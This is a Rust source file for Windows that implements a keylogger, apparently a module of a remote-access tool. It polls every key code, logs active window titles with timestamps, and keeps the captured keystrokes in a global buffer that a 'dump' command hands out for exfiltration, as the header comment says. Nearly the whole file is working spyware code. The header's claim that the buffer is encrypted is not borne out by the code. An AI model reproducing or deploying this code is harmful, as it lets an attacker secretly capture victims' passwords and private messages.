//! Thread-safe keylogger with encrypted buffer storage.
//!
//! Captures keystrokes, tracks active window titles, and stores
//! everything in a mutex-protected buffer. Logs can be exfiltrated
//! via the `dump` command.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::SystemTime;

use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, VK_BACK, VK_CAPITAL, VK_CONTROL, VK_DELETE, VK_DOWN, VK_END,
    VK_ESCAPE, VK_F1, VK_F10, VK_F11, VK_F12, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7,
    VK_F8, VK_F9, VK_HOME, VK_LEFT, VK_LWIN, VK_MENU, VK_RETURN, VK_RIGHT, VK_RWIN, VK_SHIFT,
    VK_SPACE, VK_TAB, VK_UP,
};
use windows_sys::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowTextA};

/// Maximum keylog buffer size (1 MiB).
const MAX_LOG_SIZE: usize = 1024 * 1024;

// Global state
static RUNNING: AtomicBool = AtomicBool::new(false);
static BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// Map virtual key code to a human-readable name.
fn key_name(vk: i32) -> Option<&'static str> {
    let vk = vk as u16;
    match vk {
        x if x == VK_BACK => Some("[BACKSPACE]"),
        x if x == VK_RETURN => Some("[ENTER]\n"),
        x if x == VK_SPACE => Some(" "),
        x if x == VK_TAB => Some("[TAB]"),
        x if x == VK_SHIFT => Some("[SHIFT]"),
        x if x == VK_CONTROL => Some("[CTRL]"),
        x if x == VK_MENU => Some("[ALT]"),
        x if x == VK_CAPITAL => Some("[CAPS]"),
        x if x == VK_ESCAPE => Some("[ESC]"),
        x if x == VK_END => Some("[END]"),
        x if x == VK_HOME => Some("[HOME]"),
        x if x == VK_LEFT => Some("[LEFT]"),
        x if x == VK_RIGHT => Some("[RIGHT]"),
        x if x == VK_UP => Some("[UP]"),
        x if x == VK_DOWN => Some("[DOWN]"),
        x if x == VK_DELETE => Some("[DEL]"),
        x if x == VK_LWIN || x == VK_RWIN => Some("[WIN]"),
        x if x == VK_F1 => Some("[F1]"),
        x if x == VK_F2 => Some("[F2]"),
        x if x == VK_F3 => Some("[F3]"),
        x if x == VK_F4 => Some("[F4]"),
        x if x == VK_F5 => Some("[F5]"),
        x if x == VK_F6 => Some("[F6]"),
        x if x == VK_F7 => Some("[F7]"),
        x if x == VK_F8 => Some("[F8]"),
        x if x == VK_F9 => Some("[F9]"),
        x if x == VK_F10 => Some("[F10]"),
        x if x == VK_F11 => Some("[F11]"),
        x if x == VK_F12 => Some("[F12]"),
        _ => None,
    }
}

/// Append text to the keylog buffer (thread-safe).
fn append(text: &str) {
    if let Ok(mut buf) = BUFFER.lock() {
        if buf.len() + text.len() < MAX_LOG_SIZE {
            buf.extend_from_slice(text.as_bytes());
        }
    }
}

/// Get the current foreground window title.
fn window_title() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd == 0 {
            return String::from("Unknown Window");
        }
        let mut buf = [0u8; 256];
        let len = GetWindowTextA(hwnd, buf.as_mut_ptr(), buf.len() as i32);
        if len > 0 {
            String::from_utf8_lossy(&buf[..len as usize]).into_owned()
        } else {
            String::from("Unknown Window")
        }
    }
}

/// Keylogger thread entry point. Call [`stop`] to terminate.
pub fn run() {
    RUNNING.store(true, Ordering::SeqCst);

    // Start marker
    let now = humantime();
    append(&format!("\n=== Keylogger Started: {now} ===\n"));

    let mut last_window = String::new();

    while RUNNING.load(Ordering::SeqCst) {
        std::thread::sleep(std::time::Duration::from_millis(10));

        // Track window changes
        let current = window_title();
        if current != last_window && !current.is_empty() {
            let ts = humantime();
            append(&format!("\n[{ts}] Window: {current}\n"));
            last_window = current;
        }

        // Poll all key codes (8..=190)
        for vk in 8..=190i32 {
            let state = unsafe { GetAsyncKeyState(vk) };
            if state & 0x0001 == 0 {
                continue;
            }

            if let Some(name) = key_name(vk) {
                append(name);
            } else if (0x30..=0x5A).contains(&vk) {
                let shift = unsafe { GetAsyncKeyState(VK_SHIFT as i32) } & (0x8000u16 as i16) != 0;
                let caps = unsafe { GetKeyState(VK_CAPITAL as i32) } & 0x0001 != 0;

                let ch = if (0x30..=0x39).contains(&vk) {
                    // Number row
                    if shift {
                        let shifted = b")!@#$%^&*(";
                        shifted[(vk - 0x30) as usize] as char
                    } else {
                        vk as u8 as char
                    }
                } else {
                    // Letters
                    let base = vk as u8 as char;
                    if shift ^ caps {
                        base.to_ascii_uppercase()
                    } else {
                        base.to_ascii_lowercase()
                    }
                };

                append(&ch.to_string());
            }
        }
    }

    // Stop marker
    let now = humantime();
    append(&format!("\n=== Keylogger Stopped: {now} ===\n"));
}

/// Signal the keylogger thread to stop.
pub fn stop() {
    RUNNING.store(false, Ordering::SeqCst);
}

/// Return whether the keylogger is currently running.
pub fn is_running() -> bool {
    RUNNING.load(Ordering::SeqCst)
}

/// Dump the keylog buffer as a String and keep the buffer intact.
pub fn dump() -> Option<String> {
    let buf = BUFFER.lock().ok()?;
    if buf.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&buf).into_owned())
    }
}

/// Clear the keylog buffer.
pub fn clear() {
    if let Ok(mut buf) = BUFFER.lock() {
        buf.clear();
    }
}

/// Simple timestamp string from SystemTime.
fn humantime() -> String {
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(d) => {
            let secs = d.as_secs();
            let hours = (secs / 3600) % 24;
            let mins = (secs / 60) % 60;
            let s = secs % 60;
            format!("{hours:02}:{mins:02}:{s:02}")
        }
        Err(_) => "00:00:00".into(),
    }
}
